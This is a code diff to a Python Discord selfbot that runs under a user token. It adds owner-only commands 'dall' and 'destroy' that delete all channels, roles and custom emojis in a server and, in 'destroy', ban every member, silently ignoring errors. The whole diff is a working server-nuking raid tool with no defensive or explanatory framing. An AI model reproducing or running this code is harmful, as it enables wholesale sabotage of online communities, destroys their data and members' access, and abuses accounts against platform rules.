@@ -51,4 +51,81 @@ async def rall(ctx):
                 pass
         print ("Action Completed: rall")
 
+@bot.command(pass_context=True)
+async def dall(ctx, condition):
+    if bot.user.id == ctx.message.author.id:
+        if condition.lower() == "channels":
+            for channel in list(ctx.message.server.channels):
+                try:
+                    await bot.delete_channel(channel)
+                    print (channel.name + " has been deleted in " + ctx.message.server.name)
+                except:
+                    pass
+            print ("Action Completed: dall channels")
+        elif condition.lower() == "roles":
+            for role in list(ctx.message.server.roles):
+                try:
+                    await bot.delete_role(ctx.message.server, role)
+                    print (role.name + " has been deleted in " + ctx.message.server.name)
+                except:
+                    pass
+            print ("Action Completed: dall roles")
+        elif condition.lower() == "emojis":
+            for emoji in list(ctx.message.server.emojis):
+                try:
+                    await bot.delete_custom_emoji(emoji)
+                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
+                except:
+                    pass
+            print ("Action Completed: dall emojis")
+        elif condition.lower() == "all":
+            for emoji in list(ctx.message.server.emojis):
+                try:
+                    await bot.delete_custom_emoji(emoji)
+                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
+                except:
+                    pass
+            for channel in list(ctx.message.server.channels):
+                try:
+                    await bot.delete_channel(channel)
+                    print (channel.name + " has been deleted in " + ctx.message.server.name)
+                except:
+                    pass
+            for role in list(ctx.message.server.roles):
+                try:
+                    await bot.delete_role(ctx.message.server, role)
+                    print (role.name + " has been deleted in " + ctx.message.server.name)
+                except:
+                    pass
+            print ("Action Completed: dall all")
+
+@bot.command(pass_context=True)
+async def destroy(ctx):
+    if bot.user.id == ctx.message.author.id:
+        for emoji in list(ctx.message.server.emojis):
+            try:
+                await bot.delete_custom_emoji(emoji)
+                print (emoji.name + " has been deleted in " + ctx.message.server.name)
+            except:
+                pass
+        for channel in list(ctx.message.server.channels):
+            try:
+                await bot.delete_channel(channel)
+                print (channel.name + " has been deleted in " + ctx.message.server.name)
+            except:
+                pass
+        for role in list(ctx.message.server.roles):
+            try:
+                await bot.delete_role(ctx.message.server, role)
+                print (role.name + " has been deleted in " + ctx.message.server.name)
+            except:
+                pass
+        for user in list(ctx.message.server.members):
+            try:
+                await bot.ban(user)
+                print (user.name + " has been banned from " + ctx.message.server.name)
+            except:
+                pass
+        print ("Action Completed: destroy")
+
 bot.run(token, bot=False)
